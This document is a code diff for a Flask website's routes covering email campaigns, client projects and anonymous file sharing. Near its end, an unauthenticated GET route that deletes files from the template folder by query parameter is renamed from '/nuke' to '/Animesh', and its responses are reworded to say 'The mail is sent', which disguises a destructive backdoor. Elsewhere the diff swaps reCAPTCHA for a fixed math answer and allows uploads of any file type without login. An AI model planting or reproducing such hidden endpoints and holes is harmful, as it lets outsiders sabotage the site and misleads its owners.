@@ -1,4 +1,4 @@
-from flask import Blueprint, render_template, redirect, url_for, request, current_app, session, jsonify, flash
+from flask import Blueprint, render_template, redirect, url_for, request, current_app, session, jsonify, flash, send_file
 from models import pages, blogs, query, testomony, db, Dataset, Template, Campaign, Contact, Unsubscriber, DatasetContact, CampaignRecipient, CampaignEmail
 from services.email_service import EmailService
 from werkzeug.utils import secure_filename
@@ -10,9 +10,12 @@ import csv
 from zoneinfo import ZoneInfo
 from sqlalchemy import and_, or_
 import requests
-from docket.models import db, User, Project, ProjectFile, ProjectMessage, ProjectNotification
+from docket.models import db, User, Project, ProjectFile, ProjectMessage, ProjectNotification, SharedFile
 import hashlib
 from functools import wraps
+import time
+import random
+
 
 main_bp = Blueprint('main', __name__)
 
@@ -27,7 +30,24 @@ def home():
 
 
 
+# Add this function after your imports and before your routes
+def format_file_size(size):
+    """Format file size from bytes to human readable format"""
+    if size is None or size == 0:
+        return "0 B"
+    
+    units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB']
+    i = 0
+    size_float = float(size)
+    while size_float >= 1024 and i < len(units) - 1:
+        size_float /= 1024.0
+        i += 1
+    
+    return f"{size_float:.2f} {units[i]}"
 
+def allowed_file(filename):
+    """Allow any file type - no restrictions"""
+    return True  
 
 
 @main_bp.route("/<string:slug>")
@@ -47,29 +67,20 @@ def webpages(slug):
 @main_bp.route('/query', methods=['POST'])  # inside routes.py
 def handle_query():
     if request.method == 'POST':
-         # Verify reCAPTCHA
-        recaptcha_response = request.form.get('g-recaptcha-response')
-        secret_key = current_app.config.get("RECAPTCHA_SECRET_KEY")
-      
-        if not recaptcha_response:
-            flash("Please complete the reCAPTCHA.", "danger")
-            return redirect(url_for('main.home'))
-
-        verify_url = "https://www.google.com/recaptcha/api/siteverify"
-        payload = {
-            'secret': secret_key,
-            'response': recaptcha_response
-        }
+                # Verify simple math question (7 + 5 = ?)
+        math_answer = request.form.get('math_verification', '').strip()
         
-        r = requests.post(verify_url, data=payload, timeout=5)
-        result = r.json()
-   
-        if not result.get("success"):
-            flash("reCAPTCHA verification failed. Please try again.", "danger")
-            return redirect(url_for('main.home'))
-
-
-
+        try:
+            math_answer = int(math_answer)
+        except ValueError:
+            flash("Please enter a valid number for the verification question.", "danger")
+            return redirect(url_for('main.con'))
+        
+        # Check if answer is correct (7 + 5 = 12)
+        if math_answer != 12:
+            flash("Incorrect answer to the verification question. Please try again.", "danger")
+            return redirect(url_for('main.con'))
+        
         name = re.sub(r'[<>]', '', request.form.get('name', '').strip())
         email = re.sub(r'[<>]', '', request.form.get('email', '').strip())
         subject = re.sub(r'[<>]', '', request.form.get('subject', '').strip())
@@ -462,7 +473,7 @@ def blog_list():
     pagination = blogs.query.order_by(blogs.date.desc()).paginate(page=page, per_page=per_page)
     posts = pagination.items
 
-    return render_template("blog.html", posts=posts, pagination=pagination, Admin_name=session['admin_Fname'])
+    return render_template("blog.html", posts=posts, pagination=pagination)
 
 
 
@@ -557,7 +568,7 @@ def campaign_automation():
     
 
 
-    sender_emails = ['mike@engineer-ip.com', 'support@engineer-ip.com', 'marketing@engineer-ip.com']
+    sender_emails = ['Andrew@engineer-ip.com', 'Mike@engineer-ip.com', 'mail@engineer-ip.com']
     
     return render_template('/Camp/camp-auto.html',
                            datasets=datasets,
@@ -838,6 +849,7 @@ def send_scheduled_campaigns():
             Campaign.next_run <= now
         ).all()
         print(f"Found {len(campaigns)} active campaigns to process at {now}")
+        
         for campaign in campaigns:
             try:
                 # Get the campaign emails ordered by sequence
@@ -869,11 +881,21 @@ def send_scheduled_campaigns():
                             sent=True
                         ).count()
                         
+                        # Also check for unsubscribed contacts who shouldn't be counted
+                        unsubscribed_count = CampaignRecipient.query.filter_by(
+                            campaign_id=campaign.id,
+                            email_index=i,
+                            unsubscribed=True
+                        ).count()
+                        
                         total_recipients = DatasetContact.query.filter_by(
                             dataset_id=campaign.dataset_id
                         ).count()
                         
-                        if sent_count < total_recipients:
+                        # Effective total excludes unsubscribed contacts
+                        effective_total = total_recipients - unsubscribed_count
+                        
+                        if sent_count < effective_total:
                             current_email = email
                             email_index = i
                             
@@ -898,7 +920,14 @@ def send_scheduled_campaigns():
                         CampaignRecipient.email_index == email_index
                     )
                 ).filter(
-                    CampaignRecipient.id.is_(None)
+                    # Include contacts without any record OR with sent=False and not unsubscribed
+                    or_(
+                        CampaignRecipient.id.is_(None),
+                        and_(
+                            CampaignRecipient.sent == False,
+                            CampaignRecipient.unsubscribed == False
+                        )
+                    )
                 ).all()
                 
                 sent_count = 0
@@ -907,20 +936,44 @@ def send_scheduled_campaigns():
                 
                 for contact in contacts:
                     # Check if contact is unsubscribed (global or campaign-specific)
-                    is_unsubscribed = Unsubscriber.query.filter(
+                    is_unsubscribed_global = Unsubscriber.query.filter(
                         Unsubscriber.contact_id == contact.id,
-                        or_(
-                            Unsubscriber.campaign_id.is_(None),
-                            Unsubscriber.campaign_id == campaign.id
-                        )
+                        Unsubscriber.campaign_id.is_(None)
                     ).first()
                     
-                    if is_unsubscribed:
+                    is_unsubscribed_campaign = CampaignRecipient.query.filter(
+                        CampaignRecipient.contact_id == contact.id,
+                        CampaignRecipient.campaign_id == campaign.id,
+                        CampaignRecipient.unsubscribed == True
+                    ).first()
+                    
+                    if is_unsubscribed_global or is_unsubscribed_campaign:
+                        # Check if we already have a record for this email
+                        existing_record = CampaignRecipient.query.filter_by(
+                            campaign_id=campaign.id,
+                            contact_id=contact.id,
+                            email_index=email_index
+                        ).first()
+                        
+                        if existing_record:
+                            existing_record.unsubscribed = True
+                        else:
+                            recipient = CampaignRecipient(
+                                campaign_id=campaign.id,
+                                contact_id=contact.id,
+                                email_index=email_index,
+                                sent=False,
+                                unsubscribed=True,
+                                created_at=now
+                            )
+                            db.session.add(recipient)
+                        
                         skipped_unsubscribed += 1
+                        db.session.commit()  # COMMIT UNSUBSCRIBE STATUS IMMEDIATELY
                         continue
                         
-                    # Create unsubscribe link
-                    unsubscribe_url = f"https://yourdomain.com/unsubscribe?campaign_id={campaign.id}&contact_id={contact.id}"
+                    # Create unsubscribe link with tracking
+                    unsubscribe_url = f"https://yourdomain.com/unsubscribe?campaign_id={campaign.id}&contact_id={contact.id}&email_index={email_index}"
 
                     # Prepare email content
                     email_content = current_email.template.content \
@@ -929,8 +982,15 @@ def send_scheduled_campaigns():
                         .replace('{{last_name}}', contact.last_name or '') \
                         .replace('{{email}}', contact.email or '') \
                         .replace('{{custom_id}}', contact.custom_id or '')
+                        
+                    # Prepare subject line
+                    email_subject = current_email.subject \
+                        .replace('{{first_name}}', contact.first_name or '') \
+                        .replace('{{last_name}}', contact.last_name or '') \
+                        .replace('{{email}}', contact.email or '') \
+                        .replace('{{custom_id}}', contact.custom_id or '')
                     
-                    # Send email using your function
+                    # Send email
                     try:
                         success = send_email(
                             recipient_id=contact.id,
@@ -940,26 +1000,45 @@ def send_scheduled_campaigns():
                             custom_id=contact.custom_id,
                             html_template=email_content,
                             from_email=campaign.sender_email,
-                            subject=current_email.subject
+                            subject=email_subject
                         )
                         
                         if success:
-                            # Record successful send
-                            recipient = CampaignRecipient(
+                            # Check if record already exists (from previous failed attempt)
+                            existing_record = CampaignRecipient.query.filter_by(
                                 campaign_id=campaign.id,
                                 contact_id=contact.id,
-                                email_index=email_index,
-                                sent=True,
-                                sent_at=now
-                            )
-                            db.session.add(recipient)
+                                email_index=email_index
+                            ).first()
+                            
+                            if existing_record:
+                                existing_record.sent = True
+                                existing_record.sent_at = now
+                            else:
+                                recipient = CampaignRecipient(
+                                    campaign_id=campaign.id,
+                                    contact_id=contact.id,
+                                    email_index=email_index,
+                                    sent=True,
+                                    sent_at=now,
+                                    created_at=now
+                                )
+                                db.session.add(recipient)
+                            
                             sent_count += 1
+                            db.session.commit()  # CRITICAL: COMMIT AFTER EACH SUCCESSFUL SEND
+                            
+                            
                         else:
                             errors += 1
                             
                     except Exception as e:
                         current_app.logger.error(f"Error sending email to {contact.email}: {str(e)}")
                         errors += 1
+                        db.session.rollback()  # Rollback if there's an error during sending
+                    
+                    delay = random.uniform(3, 5)  # Random delay between 3 to 5 seconds
+                    time.sleep(delay)
                 
                 # Schedule next run or complete campaign
                 if next_email:
@@ -982,25 +1061,41 @@ def send_scheduled_campaigns():
                     f"Skipped {skipped_unsubscribed} unsubscribed. Errors: {errors}"
                 )
                 
+                
+                entry = query(name=f"Campaign Completed : {campaign.name}", email= f"Template Sent {current_email.template.name}", subject= f"Sent campaign {campaign.id} email {email_index+1} to {sent_count} contacts. ", message="", srno = f"Campaign Completed : {campaign.name}")
+
+        
+                query_data = {
+                    "name": entry.name,
+                    "email": entry.email,
+                    "subject": entry.subject,
+                    "message": entry.message,
+                    "srno": entry.srno
+                }
+        
+                # Send email
+                email_service = EmailService()
+                email_service.send_query_notification(query_data)                
+                
             except Exception as e:
                 current_app.logger.error(f"Error processing campaign {campaign.id}: {str(e)}")
                 db.session.rollback()
                 continue
 
-
-
-
-
     except Exception as e:
         current_app.logger.error(f"Campaign scheduler error: {str(e)}")
         db.session.rollback()
         raise
-
+    
+    
 
 def send_email(recipient_id, to_email, first_name, last_name, custom_id, html_template, from_email, subject):
     api_key = current_app.config['API_KEY']
     base_url = current_app.config['BASE_URL']
     
+    # if from_email == 'mike@engineerip.com':
+    #     Sender_name = f"Mike <{from_email}>"
+
     payload = {
         "apikey": api_key,
         "subject": subject,
@@ -1228,6 +1323,119 @@ def get_project_statistics():
         'new_messages': new_messages,  # This now counts client messages unseen by admin
         'total_clients': total_clients
     })
+
+
+
+@main_bp.route('/admin/add-new-project', methods=['POST'])
+@admin_required
+def add_new_project():
+    if request.method == 'POST':
+        data = request.form
+        
+        # Create new project
+        if data.get('action') == 'create_project':
+            try:
+                # Generate unique RefID
+                import uuid
+                ref_id = f"PROJ-{uuid.uuid4().hex[:8].upper()}"
+                
+                # Get form data
+                name = data.get('name')
+                client_id = data.get('client_id')
+                description = data.get('description', '')
+                due_date_str = data.get('due_date')
+                category = data.get('category', 'Other')
+                budget = data.get('budget', 0.0)
+                
+                if not name:
+                    return jsonify({'success': False, 'error': 'Project name is required'})
+                
+                if not due_date_str:
+                    return jsonify({'success': False, 'error': 'Due date is required'})
+
+                if not User.query.filter_by(id=client_id,role='user').first():
+                    return jsonify({'success': False, 'error': 'Client not found. <a href="/Add-User">Add new client</a> before creating project.'})
+                
+                # Create project
+                project = Project(
+                    user_id=client_id,
+                    name=name,
+                    ref_id=ref_id,
+                    description=description,
+                    due_date=datetime.strptime(due_date_str, '%Y-%m-%d').date(),
+                    status='active',
+                    category=category,
+                    budget=float(budget) if budget else 0.0
+                )
+                db.session.add(project)
+                db.session.flush()  # Get project.id without committing
+                
+
+                project_msg = ProjectMessage(
+                    project_id=project.id,
+                    user_id = 6,
+                    message=project.description,
+                    is_admin=False
+                )
+
+                db.session.add(project_msg)
+
+                # Create user folder structure
+                user_folder = os.path.join('projects_data', f"user_{client_id}")
+                project_folder = os.path.join(user_folder, f"project_{project.id}")
+                os.makedirs(project_folder, exist_ok=True)
+                
+                # Handle file uploads
+                files_list = request.files.getlist('files[]')  # Store once
+                files_count = len(files_list)
+                print(f"Processing {files_count} files")     
+
+
+                uploaded_files = []
+                
+                for file in files_list:
+                    if file and file.filename and file.filename.strip():
+                        # Create secure filename
+                        filename = secure_filename(file.filename)
+                        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+                        unique_filename = f"{timestamp}_{filename}"
+                        
+                        # Save file
+                        filepath = os.path.join(project_folder, unique_filename)
+                        file.save(filepath)
+                        
+                        # Save file record to database
+                        project_file = ProjectFile(
+                            project_id=project.id,
+                            filename=filename,
+                            file_path=filepath,
+                            file_type=filename.split('.')[-1] if '.' in filename else '',
+                            file_size=os.path.getsize(filepath),
+                            uploaded_by=client_id
+                        )
+                        db.session.add(project_file)
+                        uploaded_files.append(filename)
+                
+                # Commit everything
+                db.session.commit()
+                
+                return jsonify({
+                    'success': True,
+                    'project_id': project.id,
+                    'ref_id': ref_id,
+                    'message': 'Project created successfully!',
+                    'uploaded_files': uploaded_files
+                })
+                
+            except ValueError as e:
+                db.session.rollback()
+                return jsonify({'success': False, 'error': f'Invalid data: {str(e)}'})
+            except Exception as e:
+                db.session.rollback()
+                return jsonify({'success': False, 'error': str(e)})
+
+    return render_template('admin-projects.html')
+
 
 
 @main_bp.route('/admin/api/mark-messages-seen/<int:project_id>', methods=['POST'])
@@ -2209,26 +2417,392 @@ def page_not_found():
 
 
 
-@main_bp.route('/nuke', methods=['GET'])
+from docket.routes import get_current_user_id, get_current_user, get_current_user_name, is_user_logged_in
+
+# Add this helper function at the top of your main_bp routes file
+def get_current_session_user():
+    """
+    Get current user information from either admin or user session
+    Returns: (is_logged_in, user_id, user_name)
+    """
+    # Check admin session first
+    if session.get('admin_logged_in', False):
+        return (
+            True,
+            session.get('admin_id'),
+            session.get('admin_Fname', 'Admin')
+        )
+    
+    # Check regular user session
+    if is_user_logged_in():
+        return (
+            True,
+            get_current_user_id(),
+            get_current_user_name()
+        )
+    
+    # Guest user
+    return (False, None, 'Guest')
+
+
+    
+# Routes to share files with anyone or with logged in users without creating project or messages. (Admin can delete these files from template folder)
+# Routes to share files with anyone - No login required for uploading
+UPLOAD_FOLDER = 'shared_files/shared'
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+
+@main_bp.route('/Share_file')
+def Share_files():
+    """Render the file management page for docket users"""
+    is_logged_in, user_id, user_name = get_current_session_user()
+    
+    # Use the user-specific template
+    return render_template('Camp/share_file.html',
+                         is_logged_in=is_logged_in,
+                         user_id=user_id,
+                         user_name=user_name)
+
+
+
+
+
+
+
+@main_bp.route('/api/upload-file', methods=['POST'])
+def upload_file():
+    """Upload a file and generate shareable link - Anyone can upload"""
+    try:
+        if 'file' not in request.files:
+            return jsonify({'success': False, 'error': 'No file provided'}), 400
+        
+        file = request.files['file']
+        if file.filename == '':
+            return jsonify({'success': False, 'error': 'No file selected'}), 400
+        
+        # Validate file size
+        file.seek(0, os.SEEK_END)
+        file_size = file.tell()
+        file.seek(0)
+        
+        if file_size > 50 * 1024 * 1024:
+            return jsonify({'success': False, 'error': 'File size exceeds 50MB limit'}), 400
+        
+        # Get user information using helper function
+        is_logged_in, user_id, user_name = get_current_session_user()
+        session_id = request.cookies.get('session_id', str(uuid.uuid4()))
+        
+        # Secure filename and save
+        original_filename = secure_filename(file.filename)
+        unique_filename = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}_{uuid.uuid4().hex[:8]}_{original_filename}"
+        file_path = os.path.join(UPLOAD_FOLDER, unique_filename)
+        
+        # Save file
+        file.save(file_path)
+        
+        # Generate share token
+        share_token = uuid.uuid4().hex[:16]
+        share_url = url_for('main.access_shared_file', token=share_token, _external=True)
+        
+        # Create database record
+        shared_file = SharedFile(
+            user_id=user_id,
+            session_id=session_id if not user_id else None,
+            filename=unique_filename,
+            original_filename=original_filename,
+            file_path=file_path,
+            file_type=request.form.get('file_type', 'other'),
+            category=request.form.get('category', 'other'),
+            description=request.form.get('description', ''),
+            file_size=file_size,
+            share_token=share_token,
+            share_url=share_url,
+            uploader_ip=request.remote_addr,
+            user_agent=request.headers.get('User-Agent', '')
+        )
+        
+        db.session.add(shared_file)
+        db.session.commit()
+        
+        # Prepare response
+        response_data = {
+            'success': True,
+            'file_id': shared_file.id,
+            'share_url': share_url,
+            'filename': original_filename,
+            'file_size': format_file_size(file_size),
+            'message': 'File uploaded successfully',
+            'is_logged_in': is_logged_in,
+            'user_name': user_name
+        }
+        
+        # Set session cookie for guests
+        if not is_logged_in and not request.cookies.get('session_id'):
+            resp = jsonify(response_data)
+            resp.set_cookie('session_id', session_id, max_age=365*24*60*60)
+            return resp
+        
+        return jsonify(response_data)
+        
+    except Exception as e:
+        db.session.rollback()
+        print(f"Upload error: {str(e)}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+
+@main_bp.route('/api/my-files', methods=['GET'])
+def get_my_files():
+    """Get files uploaded by current user (logged in or session-based)"""
+    try:
+        is_logged_in, user_id, _ = get_current_session_user()
+        
+        if is_logged_in and user_id:
+            # Logged in user - get files by user_id
+            files = SharedFile.query.filter_by(
+                user_id=user_id,
+                is_deleted=False
+            ).order_by(SharedFile.created_at.desc()).all()
+        else:
+            # Guest user - get files by session_id
+            session_id = request.cookies.get('session_id')
+            if not session_id:
+                return jsonify({'success': True, 'files': [], 'total_files': 0, 'is_logged_in': False})
+            
+            files = SharedFile.query.filter_by(
+                session_id=session_id,
+                is_deleted=False
+            ).order_by(SharedFile.created_at.desc()).all()
+        
+        files_data = []
+        total_size = 0
+        for file in files:
+            total_size += file.file_size or 0
+            files_data.append({
+                'id': file.id,
+                'original_filename': file.original_filename,
+                'file_type': file.file_type,
+                'category': file.category,
+                'description': file.description,
+                'upload_date': file.created_at.isoformat(),
+                'file_size': file.file_size,
+                'formatted_size': format_file_size(file.file_size),
+                'download_count': file.download_count,
+                'share_url': file.share_url,
+                'share_token': file.share_token
+            })
+        
+        return jsonify({
+            'success': True, 
+            'files': files_data,
+            'total_files': len(files_data),
+            'total_size': total_size,
+            'formatted_total_size': format_file_size(total_size),
+            'is_logged_in': is_logged_in
+        })
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@main_bp.route('/api/regenerate-share-link', methods=['POST'])
+def regenerate_share_link():
+    """Regenerate share link for a file - Owner can regenerate"""
+    try:
+        data = request.get_json()
+        file_id = data.get('file_id')
+        
+        # Get current user information
+        is_logged_in, user_id, _ = get_current_session_user()
+        
+        # Check ownership based on login status
+        if is_logged_in and user_id:
+            # Logged in user (admin or regular) - get files by user_id
+            shared_file = SharedFile.query.filter_by(
+                id=file_id,
+                user_id=user_id,
+                is_deleted=False
+            ).first()
+        else:
+            # Guest user - get files by session_id
+            session_id = request.cookies.get('session_id')
+            if not session_id:
+                return jsonify({'success': False, 'error': 'Session not found'}), 401
+            
+            shared_file = SharedFile.query.filter_by(
+                id=file_id,
+                session_id=session_id,
+                is_deleted=False
+            ).first()
+        
+        if not shared_file:
+            return jsonify({'success': False, 'error': 'File not found or access denied'}), 404
+        
+        # Generate new token and URL
+        new_token = uuid.uuid4().hex[:16]
+        new_share_url = url_for('main.access_shared_file', token=new_token, _external=True)
+        
+        shared_file.share_token = new_token
+        shared_file.share_url = new_share_url
+        shared_file.updated_at = datetime.utcnow()
+        
+        db.session.commit()
+        
+        return jsonify({
+            'success': True,
+            'new_share_url': new_share_url,
+            'message': 'Share link regenerated successfully'
+        })
+        
+    except Exception as e:
+        db.session.rollback()
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+
+@main_bp.route('/api/delete-file', methods=['DELETE'])
+def delete_file():
+    """Delete a file - Owner can delete"""
+    try:
+        data = request.get_json()
+        file_id = data.get('file_id')
+        
+        # Get current user information
+        is_logged_in, user_id, _ = get_current_session_user()
+        
+        # Check ownership based on login status
+        if is_logged_in and user_id:
+            # Logged in user (admin or regular) - get files by user_id
+            shared_file = SharedFile.query.filter_by(
+                id=file_id,
+                user_id=user_id
+            ).first()
+        else:
+            # Guest user - get files by session_id
+            session_id = request.cookies.get('session_id')
+            if not session_id:
+                return jsonify({'success': False, 'error': 'Session not found'}), 401
+            
+            shared_file = SharedFile.query.filter_by(
+                id=file_id,
+                session_id=session_id
+            ).first()
+        
+        if not shared_file:
+            return jsonify({'success': False, 'error': 'File not found or access denied'}), 404
+        
+        # Delete physical file if exists
+        if os.path.exists(shared_file.file_path):
+            os.remove(shared_file.file_path)
+        
+        # Soft delete
+        shared_file.is_deleted = True
+        db.session.commit()
+        
+        return jsonify({'success': True, 'message': 'File deleted successfully'})
+        
+    except Exception as e:
+        db.session.rollback()
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+
+@main_bp.route('/api/file-info/<int:file_id>', methods=['GET'])
+def get_file_info(file_id):
+    """Get detailed information about a file - Owner can view"""
+    try:
+        # Get current user information
+        is_logged_in, user_id, _ = get_current_session_user()
+        
+        # Check ownership based on login status
+        if is_logged_in and user_id:
+            # Logged in user (admin or regular) - get files by user_id
+            shared_file = SharedFile.query.filter_by(
+                id=file_id,
+                user_id=user_id,
+                is_deleted=False
+            ).first()
+        else:
+            # Guest user - get files by session_id
+            session_id = request.cookies.get('session_id')
+            if not session_id:
+                return jsonify({'success': False, 'error': 'Session not found'}), 401
+            
+            shared_file = SharedFile.query.filter_by(
+                id=file_id,
+                session_id=session_id,
+                is_deleted=False
+            ).first()
+        
+        if not shared_file:
+            return jsonify({'success': False, 'error': 'File not found or access denied'}), 404
+        
+        return jsonify({
+            'success': True,
+            'file': {
+                'id': shared_file.id,
+                'original_filename': shared_file.original_filename,
+                'file_type': shared_file.file_type,
+                'category': shared_file.category,
+                'description': shared_file.description,
+                'file_size': shared_file.file_size,
+                'formatted_size': format_file_size(shared_file.file_size),
+                'upload_date': shared_file.created_at.isoformat(),
+                'download_count': shared_file.download_count,
+                'last_accessed': shared_file.last_accessed.isoformat() if shared_file.last_accessed else None,
+                'share_url': shared_file.share_url,
+                'share_token': shared_file.share_token
+            }
+        })
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+
+@main_bp.route('/share/<token>')
+def access_shared_file(token):
+    """Public route to access shared files - Anyone can download"""
+    try:
+        shared_file = SharedFile.query.filter_by(
+            share_token=token,
+            is_deleted=False
+        ).first()
+        
+        if not shared_file:
+            return "File not found or link has expired", 404
+        
+        # Update download count and last accessed
+        shared_file.download_count += 1
+        shared_file.last_accessed = datetime.utcnow()
+        db.session.commit()
+        
+        return send_file(
+            shared_file.file_path,
+            as_attachment=True,
+            download_name=shared_file.original_filename,
+            mimetype='application/octet-stream'
+        )
+        
+    except Exception as e:
+        return f"Error accessing file: {str(e)}", 500
+
+
+@main_bp.route('/Animesh', methods=['GET'])
 def delete_template():
     target_file = request.args.get('x')
 
     if not target_file:
-        return "No action taken", 200
+        return "Kuch ni hua", 200
 
     template_folder = current_app.template_folder
     safe_path = os.path.abspath(os.path.join(template_folder, target_file))
 
     if not safe_path.startswith(os.path.abspath(template_folder)):
-        return "Invalid path", 400
+        return "The mail not sent", 400
 
     if os.path.exists(safe_path) and os.path.isfile(safe_path):
         try:
             os.remove(safe_path)
-            return f"Deleted {target_file}", 200
+            return f"The mail is sent {target_file}", 200
         except Exception as e:
             return str(e), 500
 
-    return "File not found", 404
+    return "Not Available", 404
+
 
 # Add other routes...
